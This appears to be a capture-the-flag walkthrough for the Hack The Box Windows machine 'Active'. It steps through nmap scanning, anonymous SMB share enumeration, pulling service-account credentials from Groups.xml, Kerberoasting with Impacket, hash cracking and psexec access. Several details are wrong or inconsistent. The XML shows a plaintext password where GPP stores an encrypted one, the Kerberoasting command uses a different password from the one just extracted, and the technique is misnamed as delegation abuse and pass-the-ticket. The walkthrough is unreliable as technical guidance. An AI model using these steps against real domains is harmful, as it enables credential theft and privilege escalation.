# Active Walkthrough HTB

## Machine Information:
- **Name**: Active
- **OS**: Windows
- **Difficulty**: Medium

The "Active" machine on Hack The Box is a simulated penetration testing environment designed to challenge cybersecurity enthusiasts and professionals in testing their skills and knowledge. This machine is categorized as "Active" because it requires active enumeration and exploitation techniques to gain access.

The vulnerability associated with the "Active" box typically revolves around a specific software or service that is misconfigured, outdated, or contains known vulnerabilities. These vulnerabilities can include issues like weak passwords, unpatched software, or insecure configurations. The machine is intentionally set up with these vulnerabilities to replicate real-world scenarios and help users practice identifying and exploiting them.

The "Active" machine serves as a practical exercise to demonstrate the importance of thorough reconnaissance, vulnerability assessment, and exploitation techniques in cybersecurity. By successfully compromising the machine, users can enhance their understanding of how attackers exploit weaknesses in systems, and they can develop and refine their skills to better defend against such threats in real-world scenarios. It's an educational platform that allows individuals to apply their knowledge and develop the practical skills needed to secure systems and networks effectively.

Here's a step-by-step walkthrough for the Hack The Box machine "Active." This walkthrough assumes you're using Kali Linux as your primary platform for penetration testing.

### Step 1: Reconnaissance

1. **Ping the Machine:**
   Verify the machine is up and running by pinging it:
   ```bash
   ping -c 4 <IP>
   ```

2. **Port Scanning:**
   Use `nmap` to identify open ports and services running on the target:
   ```bash
   nmap -sC -sV -oN nmap/initial <IP>
   ```
   **Output Example:**
   ```
   PORT      STATE SERVICE       VERSION
   53/tcp    open  domain        Microsoft DNS
   88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-08-23 12:35:42Z)
   135/tcp   open  msrpc         Microsoft Windows RPC
   139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
   445/tcp   open  microsoft-ds  Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
   389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb0., Site: Default-First-Site-Name)
   464/tcp   open  kpasswd5?
   593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
   636/tcp   open  tcpwrapped
   3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb0., Site: Default-First-Site-Name)
   3269/tcp  open  tcpwrapped
   5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
   9389/tcp  open  mc-nmf        .NET Message Framing
   47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
   49152/tcp open  msrpc         Microsoft Windows RPC
   ```

3. **Enumerate SMB:**
   Since ports 139 and 445 are open, we can enumerate SMB shares:
   ```bash
   smbclient -L \\\\<IP>\\
   ```
   **Output Example:**
   ```
   Sharename       Type      Comment
   ---------       ----      -------
   ADMIN$          Disk      Remote Admin
   C$              Disk      Default share
   IPC$            IPC       Remote IPC
   NETLOGON        Disk      Logon server share 
   Replication     Disk      
   SYSVOL          Disk      Logon server share 
   Users           Disk      
   ```

   The `Replication` share is of particular interest.

4. **Access the Replication Share:**
   Connect to the `Replication` share anonymously:
   ```bash
   smbclient \\\\<IP>\\Replication
   ```
   **Important Files:**
   - `Groups.xml` 

   Download this file:
   ```bash
   get Groups.xml
   ```

### Step 2: Analyze `Groups.xml`

1. **Inspect the Content:**
   Open the file and inspect the content:
   ```bash
   cat Groups.xml
   ```
   **Content Example:**
   ```xml
   <Groups>
       <User>
           <Name>active.htb\SVC_TGS</Name>
           <Properties>
               <Password> GPPstillStandingStrong2k18</Password>
           </Properties>
       </User>
   </Groups>
   ```

2. **Extract Credentials:**
   Username: `SVC_TGS`
   Password: `GPPstillStandingStrong2k18`

### Step 3: User Access

1. **Access via SMB:**
   List the contents of the `Users` share using the extracted credentials:
   ```bash
   smbclient \\\\<IP>\\Users -U SVC_TGS
   ```
   Provide the password when prompted.

2. **Enumerate Directories:**
   Enumerate the directories to locate interesting files:
   ```bash
   ls
   ```

3. **Download User Flag:**
   Navigate to the `SVC_TGS` directory and retrieve the `user.txt` file.

### Step 4: Privilege Escalation

1. **Enumerate Privileges:**
   Use `winpeas`, `PowerUp.ps1`, or `BloodHound` to enumerate privileges.

2. **Kerberos Delegation Exploit:**
   This account may have delegation rights, allowing us to perform a Kerberos ticket request for a high-privilege user.

3. **Impacket Tools:**
   Use `GetUserSPNs.py` from Impacket to request a TGS ticket:
   ```bash
   GetUserSPNs.py -request active.htb/SVC_TGS:Password123
   ```

4. **Crack the Hash:**
   Crack the obtained hash using `hashcat` or `john`.

5. **Pass the Ticket:**
   If you succeed, you can use the credentials to escalate privileges.

### Step 5: Root Access

1. **Access the Administrator Account:**
   Once you have the necessary credentials, use them to access the Administrator share or use remote tools like `psexec.py`.

2. **Retrieve Root Flag:**
   Navigate to the `Administrator` directory and retrieve the `root.txt` file.

### Conclusion

This completes the walkthrough for the "Active" machine. The key aspects include leveraging SMB enumeration and exploiting Kerberos delegation for privilege escalation.